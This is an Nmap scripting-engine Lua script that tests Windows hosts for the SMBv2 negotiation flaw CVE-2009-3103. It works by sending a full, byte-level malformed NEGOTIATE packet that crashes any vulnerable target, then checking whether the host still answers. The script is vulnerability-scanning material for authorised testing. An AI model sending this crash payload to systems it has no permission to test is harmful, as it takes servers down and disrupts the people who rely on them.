local nmap = require "nmap"
local smb = require "smb"
local stdnse = require "stdnse"
local vulns = require "vulns"

description = [[
Detects Microsoft Windows systems vulnerable to denial of service (CVE-2009-3103).
This script will crash the service if it is vulnerable.

The script performs a denial-of-service against the vulnerability disclosed in
CVE-2009-3103. This works against Windows Vista and some versions of Windows 7,
and causes a bluescreen if successful. The proof-of-concept code at
http://seclists.org/fulldisclosure/2009/Sep/39 was used, with one small change.

This check was previously part of smb-check-vulns.
]]

---
--@usage
-- nmap --script smb-vuln-cve2009-3103.nse -p445 <host>
-- nmap -sU --script smb-vuln-cve2009-3103.nse -p U:137,T:139 <host>
--
--@output
--Host script results:
--| smb-vuln-cve2009-3103:
--|   VULNERABLE:
--|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
--|     State: VULNERABLE
--|     IDs:  CVE:CVE-2009-3103
--|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
--|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
--|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
--|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
--|           aka "SMBv2 Negotiation Vulnerability." NOTE: some of these details are obtained from third party information.
--|
--|     Disclosure date: 2009-09-08
--|     References:
--|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
--|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
---

author = {"Ron Bowes", "Jiayi Ye", "Paulino Calderon <calderon()websec.mx>"}
copyright = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","exploit","dos","vuln"}
-- run after all smb-* scripts (so if it DOES crash something, it doesn't kill
-- other scans have had a chance to run)
dependencies = {
  "smb-brute", "smb-enum-sessions", "smb-security-mode",
  "smb-enum-shares", "smb-server-stats",
  "smb-enum-domains", "smb-enum-users", "smb-system-info",
  "smb-enum-groups", "smb-os-discovery", "smb-enum-processes",
  "smb-psexec",
};


hostrule = function(host)
  return smb.get_port(host) ~= nil
end

local VULNERABLE = 1
local PATCHED    = 2

local function check_smbv2_dos(host)
  -- From http://seclists.org/fulldisclosure/2009/Sep/0039.html with one change on the last line.
  local buf = "\x00\x00\x00\x90" ..  -- Begin SMB header: Session message
    "\xff\x53\x4d\x42" .. -- Server Component: SMB
    "\x72\x00\x00\x00" .. -- Negociate Protocol
    "\x00\x18\x53\xc8" .. -- Operation 0x18 & sub 0xc853
    "\x00\x26"             .. -- Process ID High: --> :) normal value should be "\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe" ..
    "\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54" ..
    "\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31" ..
    "\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00" ..
    "\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57" ..
    "\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61" ..
    "\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c" ..
    "\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c" ..
    "\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e" ..
    "\x30\x30\x32\x00"

  local socket = nmap.new_socket()
  if(socket == nil) then
    return false, "Couldn't create socket"
  end

  local status, result = socket:connect(host, 445)
  if(status == false) then
    socket:close()
    return false, "Couldn't connect to host: " .. result
  end

  status, result = socket:send(buf)
  if(status == false) then
    socket:close()
    return false, "Couldn't send the buffer: " .. result
  end

  -- Close the socket
  socket:close()

  -- Give it some time to crash
  stdnse.debug1("Waiting 5 seconds to see if Windows crashed")
  stdnse.sleep(5)

  -- Create a new socket
  socket = nmap.new_socket()
  if(socket == nil) then
    return false, "Couldn't create socket"
  end

  -- Try and do something simple
  stdnse.debug1("Attempting to connect to the host")
  socket:set_timeout(5000)
  status, result = socket:connect(host, 445)

  -- Check the result
  if(status == false or status == nil) then
    stdnse.debug1("Connect failed, host is likely vulnerable!")
    socket:close()
    return true, VULNERABLE
  end

  -- Try sending something
  stdnse.debug1("Attempting to send data to the host")
  status, result = socket:send("AAAA")
  if(status == false or status == nil) then
    stdnse.debug1("Send failed, host is likely vulnerable!")
    socket:close()
    return true, VULNERABLE
  end

  stdnse.debug1("Checks finished; host is likely not vulnerable.")
  socket:close()
  return true, PATCHED
end

action = function(host)

  local status, result, message
  local response = {}
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host)
  local vuln_table = {
    title = 'SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)',
    state = vulns.STATE.NOT_VULN,
    description = [[
    Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
    Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
    denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
    PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
    aka "SMBv2 Negotiation Vulnerability."
    ]],
    IDS = {CVE = 'CVE-2009-3103'},
    references = {
      'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103'
    },
    dates = {
      disclosure = {year = '2009', month = '09', day = '08'},
    }
  }

  -- Check for SMBv2 vulnerability
  status, result = check_smbv2_dos(host)
  if(status == false) then
    vuln_table.state = vulns.STATE.NOT_VULN
  else
    if(result == VULNERABLE) then
      vuln_table.state = vulns.STATE.VULN
   else
      vuln_table.state = vulns.STATE.NOT_VULN
    end
  end
  return vuln_report:make_output(vuln_table)
end
